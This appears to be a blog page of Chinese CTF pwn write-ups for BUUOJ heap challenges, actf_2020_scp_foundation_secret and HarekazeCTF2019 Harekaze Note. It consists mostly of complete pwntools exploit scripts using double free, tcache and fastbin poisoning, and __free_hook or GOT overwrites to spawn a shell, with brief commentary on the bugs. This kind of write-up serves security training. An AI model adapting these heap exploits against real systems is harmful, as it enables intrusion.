class="string">&quot;1&quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">112</span>)  # <span class="number">1</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(rld().ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) + <span class="number">0x7FA561345000</span> - <span class="number">0x7FA561709B78</span></span><br><span class="line"></span><br><span class="line">add(b<span class="string">&quot;a&quot;</span> * <span class="number">8</span>, b<span class="string">&quot;1&quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">112</span>)  # <span class="number">2</span></span><br><span class="line">add(b<span class="string">&quot;a&quot;</span> * <span class="number">8</span>, b<span class="string">&quot;1&quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">112</span>)</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    p64(<span class="number">0</span>)</span><br><span class="line">    + p64(<span class="number">0x21</span>)</span><br><span class="line">    + p64(libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>] - <span class="number">0x10</span>)</span><br><span class="line">    + p64(<span class="number">1</span>)</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">1</span></span><br><span class="line">    + p64(<span class="number">0x51</span>)</span><br><span class="line">    + b<span class="string">&quot;a&quot;</span> * (<span class="number">112</span> - <span class="number">8</span> * <span class="number">6</span>),</span><br><span class="line">)</span><br><span class="line">edit(<span class="number">3</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]) + b<span class="string">&quot;a&quot;</span> * (<span class="number">112</span> - <span class="number">8</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line">it()</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h2><h3 id="actf-2020-scp-foundation-secret"><a href="#actf-2020-scp-foundation-secret" class="headerlink" title="actf_2020_scp_foundation_secret"></a>actf_2020_scp_foundation_secret</h3><p>题目还不错，就是free没清空<br>这里我利用got表覆盖<br>因为size只check低4字节，而且不管你符号位，比如说0x40,0x4f都可以，而且也不check prev_inuse这个内容，所以可以覆盖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = &quot;./actf_2020_scp_foundation_secret&quot;</span><br><span class="line">parm=elf_path</span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=&quot;debug&quot;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    remote_ip = &quot;node4.buuoj.cn&quot;</span><br><span class="line">    remote_port =26198</span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line">else:</span><br><span class="line">    io = process(parm)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    global io</span><br><span class="line">    gdbscript = &quot;&quot;&quot;</span><br><span class="line">    b system</span><br><span class="line">    c</span><br><span class="line">    x/10xg 0x603120</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug_force():</span><br><span class="line">    global io</span><br><span class="line">    io.close()</span><br><span class="line">    gdbscript = &quot;&quot;&quot;</span><br><span class="line">    set follow-fork-mode parent</span><br><span class="line">    b fini</span><br><span class="line">    c</span><br><span class="line">    </span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    io=gdb.debug(parm, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#112</span><br><span class="line">def add(size,content,len,desc):</span><br><span class="line">    sla(b&quot;&gt; Now please tell me what you want to do :&quot;,b&quot;2&quot;)</span><br><span class="line">    sla(b&quot;&gt; SCP name&#x27;s length : &quot;,str(size))</span><br><span class="line">    sa(b&quot;&gt; SCP name : &quot;,content)</span><br><span class="line">    sla(b&quot;&gt; SCP description&#x27;s length : &quot;,str(len))</span><br><span class="line">    sa(b&quot;&gt; SCP description : &quot;,desc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#没有清空</span><br><span class="line">def free(idx):</span><br><span class="line">    sla(b&quot;&gt; Now please tell me what you want to do :&quot;,b&quot;4&quot;)</span><br><span class="line">    sla(b&quot;&gt; SCP project ID : &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sla(b&quot;&gt; Now please tell me what you want to do :&quot;,b&quot;5&quot;)</span><br><span class="line">    sla(b&quot;&gt; SCP project ID : &quot;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(b&quot;&gt; Username:&quot;,b&quot;a&quot;*5)</span><br><span class="line">sa(b&quot;&gt; Password:&quot;,b&quot;For_the_glory_of_Brunhild&quot;)</span><br><span class="line">add(0x58,b&quot;a&quot;,0x58,b&quot;b&quot;)</span><br><span class="line">add(0x58,b&quot;a&quot;,0x28,b&quot;b&quot;)</span><br><span class="line">add(0x58,b&quot;a&quot;,0x58,b&quot;b&quot;)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">add(0x28,p64(0)+p64(0x21),0x18,b&quot;\x70&quot;)</span><br><span class="line">add(0x58,b&quot;\x50&quot;,0x58,p64(0)+p64(0x61))</span><br><span class="line">add(0x58,b&quot;\x00&quot;,0x58,p64(0)*9+p64(0xb1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">show(1)</span><br><span class="line">ru(b&quot;SCP&#x27;s description is &quot;)</span><br><span class="line">libc_base=u64(ru(b&quot;\x7f&quot;).ljust(8,b&quot;\0&quot;))+0x7fec22b9f000-0x7fec22f63b78</span><br><span class="line"></span><br><span class="line">add(0x58,b&quot;a&quot;,0x28,b&quot;a&quot;)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">add(0x28,p64(0)+p64(0x21),0x58,p64(elf.got[&quot;free&quot;]-0x1e))</span><br><span class="line">add(0x58,b&quot;/bin/sh\0&quot;,0x58,b&quot;a&quot;)</span><br><span class="line">add(0x58,b&quot;a&quot;*0xe+p64(libc_base+libc.sym[&quot;system&quot;]),0x18,b&quot;a&quot;)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">it()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="HarekazeCTF2019-Harekaze-Note"><a href="#HarekazeCTF2019-Harekaze-Note" class="headerlink" title="[HarekazeCTF2019]Harekaze Note"></a>[HarekazeCTF2019]Harekaze Note</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HarekazeCTF2019]Harekaze%20Note">https://buuoj.cn/challenges#[HarekazeCTF2019]Harekaze%20Note</a><br>题目不错 29的libc<br>函数没啥问题<br>他有一个titile的0x28结构体，和自定义的content结构体，free的时候没有清空title里面保存的content指针,导致可以double free<br>这个题目我做复杂了<br>比如说</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">edit(<span class="string">b&quot;a&quot;</span>,<span class="number">0x38</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;c&quot;</span>)</span><br><span class="line">edit(<span class="string">b&quot;c&quot;</span>,<span class="number">0x38</span>,<span class="string">b&quot;c&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;c&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"><span class="number">0x38</span>被free了两次</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#  -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./note&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> <span class="keyword">in</span> libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4526A</span>, <span class="number">0x45216</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;2.27&quot;</span> <span class="keyword">in</span> libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#b *$rebase(0xF56) malloc调试</span></span><br><span class="line"><span class="comment"># b *$rebase(0x1205) flag测试</span></span><br><span class="line"><span class="comment"># b *$rebase(0x148B) free</span></span><br><span class="line"><span class="comment"># gdbscript = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     b *$rebase(0x1199)</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># db=gdb.debug(&quot;./server&quot;,gdbscript=gdbscript)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">27993</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0x1573)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/xw $rebase(0x4060)</span></span><br><span class="line"><span class="string">    x/2xg $rebase(0x4090)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># def debug_force():</span></span><br><span class="line"><span class="comment">#     global io</span></span><br><span class="line"><span class="comment">#     io.close()</span></span><br><span class="line"><span class="comment">#     gdbscript = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     b *$rebase(0x145F)</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     io=gdb.debug(elf_path,gdbscript=gdbscript)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#15个字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">title</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Choice: &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Title: &quot;</span>,title)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">title</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Choice: &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Title of note to delete: &quot;</span>,title)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">title</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Choice: &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;itle of note to show content: &quot;</span>,title)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">title,size,content</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Choice: &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Title of note to write content: &quot;</span>,title)</span><br><span class="line">    sla(<span class="string">b&quot;Size of content: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_str_asmencode</span>(<span class="params">content: <span class="built_in">str</span></span>):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">        out = <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i))</span><br><span class="line">    edit(<span class="built_in">str</span>(i),<span class="number">0x50</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">edit(<span class="built_in">str</span>(<span class="number">6</span>),<span class="number">0x40</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">edit(<span class="built_in">str</span>(<span class="number">7</span>),<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">add(<span class="built_in">str</span>(<span class="number">9</span>))</span><br><span class="line">edit(<span class="built_in">str</span>(<span class="number">8</span>),<span class="number">0x40</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;b&quot;</span>)</span><br><span class="line">edit(<span class="string">b&quot;a&quot;</span>,<span class="number">0x28</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;c&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">20</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i))</span><br><span class="line">    add(<span class="string">b&quot;&quot;</span>)</span><br><span class="line">    edit(<span class="built_in">str</span>(i),<span class="number">0x50</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>,<span class="number">30</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(<span class="built_in">str</span>(i))</span><br><span class="line">free(<span class="string">b&quot;c&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;b&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;a&quot;</span>)<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;&quot;</span>)</span><br><span class="line">add(<span class="built_in">str</span>(<span class="number">9</span>))</span><br><span class="line">add(<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">add(p64(<span class="number">0</span>)+p16(<span class="number">0x441</span>))</span><br><span class="line">free(<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="built_in">str</span>(<span class="number">20</span>),<span class="number">0x38</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">edit(<span class="built_in">str</span>(<span class="number">21</span>),<span class="number">0x38</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">edit(<span class="built_in">str</span>(<span class="number">22</span>),<span class="number">0x38</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#edit(str(23),0x18,b&quot;a&quot;)</span></span><br><span class="line">add(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">edit(<span class="built_in">str</span>(<span class="number">23</span>),<span class="number">0x18</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;test&quot;</span>)</span><br><span class="line">add(<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">show(<span class="string">b&quot;test&quot;</span>)</span><br><span class="line">libc_base=u64(ru(<span class="string">b&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\0&quot;</span>))+<span class="number">0x7fc24e188000</span>-<span class="number">0x7fc24e36cca0</span></span><br><span class="line">add(<span class="string">b&quot;11&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;12&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;test2&quot;</span>.ljust(<span class="number">8</span>,<span class="string">b&quot;\0&quot;</span>)+p32(<span class="number">0x31</span>))</span><br><span class="line">edit(<span class="string">b&quot;11&quot;</span>,<span class="number">0x18</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;13&quot;</span>)</span><br><span class="line">show(<span class="string">b&quot;test2&quot;</span>)</span><br><span class="line">heap_addr=u64(rld().ljust(<span class="number">8</span>,<span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">edit(<span class="string">b&quot;5&quot;</span>,<span class="number">0x10</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;d&quot;</span>)</span><br><span class="line">edit(<span class="string">b&quot;a&quot;</span>,<span class="number">0x28</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;c&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;11&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;7&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;c&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_haep_addr=heap_addr-<span class="number">0x1e0</span>+<span class="number">0x210</span>-<span class="number">0x30</span></span><br><span class="line">add(<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">add(p64(target_haep_addr))</span><br><span class="line">add(<span class="string">b&quot;aa&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">edit(<span class="string">b&quot;a&quot;</span>,<span class="number">0x28</span>,p64(<span class="number">0</span>)+p64(heap_addr+<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">edit(<span class="string">b&quot;9&quot;</span>,<span class="number">0x18</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">edit(<span class="string">b&quot;8&quot;</span>,<span class="number">0x18</span>,p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">free(<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">it()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里我做的比较复杂<br>首先考虑到<br>libc 2.29 check tcache double free<br>所以填满tcache,然后fast bin double<br>但是第一次打完以后，其实tcache坏掉了<br>fastbin会checkSize,但是tcache不check size<br>我这里利用泄露堆地址。free(0x18)的content结构体<br>然后利用上面相邻的0x28的结构体进行溢出，修改free tcache的ptr,伪造tcache指向free_hook然后get shell</p>
